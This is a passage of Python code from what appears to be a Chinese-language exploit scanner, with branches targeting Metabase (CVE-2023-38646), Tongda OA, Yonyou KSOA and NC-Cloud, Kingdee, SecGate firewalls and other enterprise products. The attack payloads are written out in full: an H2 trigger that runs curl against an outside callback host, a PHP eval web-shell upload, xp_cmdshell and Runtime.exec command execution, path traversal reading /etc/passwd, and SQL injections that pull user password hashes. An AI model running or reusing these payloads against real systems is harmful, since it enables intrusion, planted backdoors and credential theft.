        api_token = "394eb5e86394352a6270dc6a60dc7848"
        payload_id = "0uim95.ceye.io"

        # 构建API请求的参数
        params = {
            "token": api_token,
            "type": "dns",
            "filter": payload_id
        }

        # 构建API请求的URL
        request_url = f"{api_base_url}/records"

        if url.endswith("/"):
            path = "api/session/properties"
        else:
            path = "/api/session/properties"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url
        encodetext = url + path

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close"
        }

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200:
                # 定义用于匹配 "setup-token" 值的正则表达式模式
                pattern = r'"setup-token":"([a-f0-9-]+)"'

                # 使用正则表达式查找匹配的值
                match = re.search(pattern, res)

                # 检查是否找到匹配项，并提取值
                if match:
                    setup_token_value = match.group(1)
                    append_to_output(f"token_value: {setup_token_value}", "yellow")
                    append_to_output(f"将token_value带入，进一步检测与认证", "yellow")
                    if url.endswith("/"):
                        path = "api/setup/validate"
                    else:
                        path = "/api/setup/validate"

                    encodetext_two = url + path
                    # 构建请求头和 JSON 数据
                    headers = {
                        "Content-Type": "application/json",
                    }
                    json_data = {
                        "token": setup_token_value,
                        "details": {
                            "is_on_demand": False,
                            "is_full_sync": False,
                            "is_sample": False,
                            "cache_ttl": None,
                            "refingerprint": False,
                            "auto_run_queries": True,
                            "schedules": {},
                            "details": {
                                "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl 0uim95.ceye.io')\n$$--=x",
                                "advanced-options": False,
                                "ssl": True
                            },
                            "name": "test",
                            "engine": "h2"
                        }
                    }
                    try:
                        response_ceye = requests.get(request_url, params=params, verify=False, proxies=None)
                        if response_ceye.status_code == 200:
                            data = response_ceye.json()
                            records = data.get("data", [])
                            id_count = len(records)

                            if id_count > 0:
                                append_to_output(f"CEYE收到请求记录，共收到 {id_count} 个id属性记录。", "yellow")
                                append_to_output("请求记录列表：", "yellow")
                                for record in records:
                                    append_to_output(str(record), "yellow")
                            else:
                                append_to_output("CEYE没有收到请求记录。")

                        else:
                            append_to_output("API请求失败。HTTP状态码：", response_ceye.status_code)

                        response = requests.post(encodetext_two, headers=headers, json=json_data, verify=False,
                                                 timeout=10, proxies=proxies)
                        res = response.text
                        if response.status_code == 400:
                            time.sleep(10)
                            response_ceye = requests.get(request_url, params=params, verify=False, timeout=10,
                                                         proxies=proxies)
                            if response_ceye.status_code == 200:
                                data = response_ceye.json()
                                records = data.get("data", [])
                                id_count_change = len(records)

                                if id_count_change > id_count:
                                    append_to_output(
                                        f"CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认 {url} 存在漏洞",
                                        "red")
                                    append_to_output("请求记录列表：", "yellow")
                                    for record in records:
                                        append_to_output(str(record), "yellow")
                                else:
                                    append_to_output("CEYE没有收到请求记录，误报。", "green")

                            else:
                                append_to_output(f"API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
                        else:
                            append_to_output(Fore.RED + f"[-]{url}不存在Metabase RCE漏洞(CVE-2023-38646)", "green")
                    except Timeout:
                        append_to_output(f"[!] 请求超时，但是检测一下ceye是否有变化: {url}", "yellow")
                        response_ceye = requests.get(request_url, params=params, verify=False, timeout=10,
                                                     proxies=proxies)
                        if response_ceye.status_code == 200:
                            data = response_ceye.json()
                            records = data.get("data", [])
                            id_count_change = len(records)

                            if id_count_change > id_count:
                                append_to_output(
                                    f"CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认 {url} 存在漏洞",
                                    "red")
                                append_to_output("请求记录列表：", "yellow")
                                for record in records:
                                    append_to_output(str(record), "yellow")
                                append_to_output(f"确认 {url} 是存在Metabase RCE漏洞(CVE-2023-38646)", "red")
                            else:
                                append_to_output("CEYE没有收到请求记录，跳过这个URL。", "green")

                        else:
                            append_to_output(f"API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
                    except Exception as e:
                        append_to_output(str(e))
                else:
                    append_to_output(f"[-] {url} 未找到 setup-token 的值,不存在Metabase RCE漏洞(CVE-2023-38646)",
                                     "green")
            else:
                append_to_output(f"[-] {url} 不存在Metabase RCE漏洞(CVE-2023-38646)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "48.用友时空KSOA软件前台文件上传漏洞":

        if url.endswith("/"):
            path = "servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=1.jsp"
        else:
            path = "/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=1.jsp"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Connection": "keep-alive",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cookie": "JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9",
        }

        data = '''<% out.println("hello"); %>'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200:
                append_to_output(f"[+] {url} 可能存在用友时空KSOA软件前台文件上传漏洞！！！！", "yellow")

                append_to_output("发送请求包进行漏洞确认", "green")
                if url.endswith("/"):
                    path = "pictures/1.jsp"
                else:
                    path = "/pictures/1.jsp"

                if not url.startswith('http://') and not url.startswith('https://'):
                    url = 'http://' + url
                else:
                    url_new = url
                end_newpath = url_new + path
                try:
                    newreq = requests.get(end_newpath, timeout=10, verify=False, proxies=proxies)
                    newres = newreq.text
                    if newreq.status_code == 200 and 'hello' in newres:
                        append_to_output(f"[+] {end_newpath} 确认无误,存在漏洞！！！！", "red")
                        append_to_output(f"[+] 返回数据为: {newres} ", "red")
                        with open("output.txt", "a") as file:
                            file.write(f"[+] {url} 存在用友时空KSOA软件前台文件上传漏洞！！！！" + "\n")
                            file.write(res + "\n")
                    else:
                        append_to_output(f"[+] {end_newpath} 可能不存在漏洞！！！！", "green")
                except Timeout:
                    append_to_output(f"[!] 寻找1.jsp文件请求超时，跳过URL: {end_newpath}", "yellow")
                except Exception as e:
                    append_to_output(str(e), "yellow")
            else:
                append_to_output(f"[-] {url} 不存在用友时空KSOA软件前台文件上传漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "49.金蝶云星空任意文件读取漏洞":

        if url.endswith("/"):
            path = "CommonFileServer/c%3A%2Fwindows%2Fwin.ini"
        else:
            path = "/CommonFileServer/c%3A%2Fwindows%2Fwin.ini"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在金蝶云星空任意文件读取漏洞！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在金蝶云星空任意文件读取漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "50.通达OA SQL注入漏洞(CVE-2023-4165)":

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "close",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip,deflate",
            "Cookie": "PHPSESSID=4n867pmrrp4nendg0tsngl7g70; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c74d7ebb"
        }
        if url.endswith("/"):
            path = "general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1"
        else:
            path = "/general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200:
                if '重新登录' in res or 'Burp Suite Professional' in res:
                    append_to_output(f"[-] {url} 不存在通达OA SQL注入漏洞(CVE-2023-4165)", "green")
                else:
                    append_to_output(f"[+] {url} 存在通达OA SQL注入漏洞(CVE-2023-4165)！！！！", "red")
                    append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在通达OA SQL注入漏洞(CVE-2023-4165)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "51.通达OA SQL注入漏洞(CVE-2023-4166)":

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "close",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip,deflate",
            "Cookie": "PHPSESSID=4n867pmrrp4nendg0tsngl7g70; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c74d7ebb"
        }
        if url.endswith("/"):
            path = "general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and (substr(DATABASE(),2,1))=char(68) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1"
        else:
            path = "/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and (substr(DATABASE(),2,1))=char(68) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200:
                if '重新登录' in res or 'Burp Suite Professional' in res:
                    append_to_output(f"[-] {url} 不存在通达OA SQL注入漏洞(CVE-2023-4166)", "green")
                else:
                    append_to_output(f"[+] {url} 存在通达OA SQL注入漏洞(CVE-2023-4166)！！！！", "red")
                    append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在通达OA SQL注入漏洞(CVE-2023-4166)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "52.绿盟sas安全审计系统任意文件读取漏洞":

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "close",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip,deflate",
        }
        if url.endswith("/"):
            path = "webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd"
        else:
            path = "/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.get(encodetext, headers=headers, timeout=5, verify=False, proxies=proxies)
            res = req.text

            if req.status_code == 200:
                if 'Your ip cannot access web service' in res or 'service is unavailable in the current state' in res:
                    append_to_output(f"[-] {url} 不存在绿盟sas安全审计系统任意文件读取漏洞", "green")
                else:
                    append_to_output(f"[+] {url} 存在绿盟sas安全审计系统任意文件读取漏洞！！！！", "red")
                    append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在绿盟sas安全审计系统任意文件读取漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "53.网神 SecGate 3600 防火墙任意文件上传漏洞":

        if url.endswith("/"):
            path = "?g=obj_app_upfile"
        else:
            path = "/?g=obj_app_upfile"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Connection": "keep-alive",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cookie": "JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9",
        }

        data = '''------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n10000000\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="upfile"; filename="1.php"\r\nContent-Type: text/plain\r\n\r\n<?php\r\neval($_POST["pass"]);\r\n\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="submit_post"\r\n\r\nobj_app_upfile\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="__hash__"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200:
                append_to_output(f"[+] {url} 可能存在网神 SecGate 3600 防火墙任意文件上传漏洞！！！！", "yellow")

                append_to_output("发送请求包进行漏洞确认", "green")
                if url.endswith("/"):
                    path = "attachements/1.php"
                else:
                    path = "/attachements/1.php"

                if not url.startswith('http://') and not url.startswith('https://'):
                    url = 'http://' + url
                else:
                    url_new = url
                end_newpath = url_new + path
                try:
                    newreq = requests.get(end_newpath, timeout=10, verify=False, proxies=proxies)
                    newres = newreq.text
                    if newreq.status_code == 200:
                        append_to_output(f"[+] {end_newpath} 确认无误,存在漏洞！！！！", "red")
                        append_to_output(f"[+] 返回数据为: {newres} ", "red")
                        with open("output.txt", "a") as file:
                            file.write(f"[+] {url} 存在网神 SecGate 3600 防火墙任意文件上传漏洞！！！！" + "\n")
                            file.write(res + "\n")
                    else:
                        append_to_output(f"[+] {end_newpath} 可能不存在漏洞！！！！", "green")
                except Timeout:
                    append_to_output(f"[!] 寻找1.php文件请求超时，跳过URL: {end_newpath}", "yellow")
                except Exception as e:
                    append_to_output(str(e), "yellow")
            else:
                append_to_output(f"[-] {url} 不存在网神 SecGate 3600 防火墙任意文件上传漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "54.大华智慧园区综合管理平台SQL注入漏洞":

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "close",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip,deflate",
            "Cookie": "PHPSESSID=4n867pmrrp4nendg0tsngl7g70; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c74d7ebb"
        }
        if url.endswith("/"):
            path = "portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/%7B%7D"
        else:
            path = "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/%7B%7D"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, verify=False, timeout=5, proxies=proxies)
            res = req.text

            if 'XPATH' in res:
                append_to_output(f"[+] {url} 存在大华智慧园区综合管理平台SQL注入漏洞！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在大华智慧园区综合管理平台SQL注入漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "55.金和OA C6-GetSqlData.aspx SQL注入漏洞":

        if url.endswith("/"):
            path = "?g=obj_app_upfile"
        else:
            path = "/?g=obj_app_upfile"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Connection": "keep-alive",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cookie": "JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9",
        }

        data = '''exec master..xp_cmdshell 'ipconfig' '''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200:
                append_to_output(f"[+] {url} 可能存在金和OA C6-GetSqlData.aspx SQL注入漏洞！！！！", "yellow")
                append_to_output(f"[+] 返回数据为: {res} ", "red")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在金和OA C6-GetSqlData.aspx SQL注入漏洞！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在金和OA C6-GetSqlData.aspx SQL注入漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "56.用友-NC-Cloud远程代码执行漏洞":

        if url.endswith("/"):
            path = "0811.jsp?error=bsh.Interpreter"
        else:
            path = "/0811.jsp?error=bsh.Interpreter"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cookie": "cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.server",
            "If-Modified-Since": "Mon, 11 May 2020 15:41:36 GMT",
            "Connection": "close",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        data = '''cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ifconfig").getInputStream())'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200 and 'Burp Suite Professional' not in res:
                append_to_output(f"[+] {url} 存在用友-NC-Cloud远程代码执行漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在用友-NC-Cloud远程代码执行漏洞！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在用友-NC-Cloud远程代码执行漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "57.广联达 Linkworks办公OA SQL注入漏洞":

        if url.endswith("/"):
            path = "Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"
        else:
            path = "/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "close",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        data = '''key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200 and ':' in res:
                append_to_output(f"[+] {url} 存在广联达 Linkworks办公OA SQL注入漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在广联达 Linkworks办公OA SQL注入漏洞！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在广联达 Linkworks办公OA SQL注入漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "58.企业微信0daysecret漏洞":

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "close",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip,deflate",
            "Cookie": "PHPSESSID=4n867pmrrp4nendg0tsngl7g70; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c74d7ebb"
        }
        if url.endswith("/"):
            path = "cgi-bin/gateway/agentinfo"
        else:
            path = "/cgi-bin/gateway/agentinfo"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if 'Secret' in res:
                append_to_output(f"[+] {url} 存在企业微信0daysecret漏洞！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在企业微信0daysecret漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "59.用友时空KSOA SQL注入漏洞":

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "close",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip,deflate",
            "Cookie": "PHPSESSID=4n867pmrrp4nendg0tsngl7g70; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c74d7ebb"
        }
        if url.endswith("/"):
            path = "servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27;WAITFOR%20DELAY%20%270:0:10%27--"
        else:
            path = "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27;WAITFOR%20DELAY%20%270:0:10%27--"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            expected_time = 10  # 期望的回包时间，单位为秒
            start_time = time.time()
            req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
            res = req.text
            end_time = time.time()

            response_time = end_time - start_time
            if response_time >= expected_time:
                append_to_output(f"[+] {url} 存在用友时空KSOA SQL注入漏洞！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在用友时空KSOA SQL注入漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "60.任我行CRM系统 SQL注入漏洞":

        if url.endswith("/"):
            path = "SMS/SmsDataList/?pageIndex=1&pageSize=30"
        else:
            path = "/SMS/SmsDataList/?pageIndex=1&pageSize=30"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "close",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        data = '''Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
